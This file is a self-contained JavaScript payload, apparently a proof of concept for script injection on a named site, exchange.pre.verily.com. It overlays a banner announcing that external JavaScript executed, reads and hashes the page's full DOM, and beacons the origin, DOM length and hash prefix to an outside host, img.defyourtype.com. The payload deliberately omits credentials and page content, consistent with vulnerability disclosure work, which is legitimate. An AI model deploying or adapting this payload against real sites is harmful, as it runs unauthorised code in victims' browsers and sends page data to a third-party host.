(() => {
  "use strict";

  if (location.origin !== "https://exchange.pre.verily.com") return;
  if (window.__exchangeExecutionEndpointProof) return;

  const marker = "willow-signal-73e4";
  const endpoint = "https://img.defyourtype.com/x/willow-signal-73e4.txt";
  const result = {
    marker,
    origin: location.origin,
    endpoint,
    domLength: 0,
    domHashPrefix: "pending",
    callbackSent: false,
  };
  window.__exchangeExecutionEndpointProof = result;

  const panel = document.createElement("pre");
  panel.id = marker;
  Object.assign(panel.style, {
    position: "fixed",
    inset: "14px 14px auto 14px",
    zIndex: "2147483647",
    margin: "0",
    padding: "20px",
    border: "4px solid #38bdf8",
    borderRadius: "10px",
    background: "#082f49",
    color: "#f0f9ff",
    whiteSpace: "pre-wrap",
    font: "700 17px/1.5 Arial,sans-serif",
  });
  document.body.appendChild(panel);

  const draw = () => {
    panel.textContent = [
      "EXTERNAL JAVASCRIPT EXECUTED ON EXCHANGE",
      `Origin: ${result.origin}`,
      `DOM bytes read: ${result.domLength}`,
      `DOM hash prefix: ${result.domHashPrefix}`,
      `Execution endpoint: ${endpoint}`,
      `Callback dispatched: ${result.callbackSent}`,
    ].join("\n");
  };

  const digestPrefix = async (value) => {
    const digest = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(value),
    );
    return [...new Uint8Array(digest)]
      .map((part) => part.toString(16).padStart(2, "0"))
      .join("")
      .slice(0, 12);
  };

  draw();
  const dom = document.documentElement.outerHTML;
  result.domLength = dom.length;
  digestPrefix(dom).then((hash) => {
    result.domHashPrefix = hash;
    const query = new URLSearchParams({
      marker,
      event: "executed",
      origin: result.origin,
      domLength: String(result.domLength),
      domHashPrefix: result.domHashPrefix,
    });
    result.callbackSent = true;
    draw();
    fetch(`${endpoint}?${query}`, {
      mode: "no-cors",
      credentials: "omit",
      keepalive: true,
    }).catch(() => {});
  });
})();
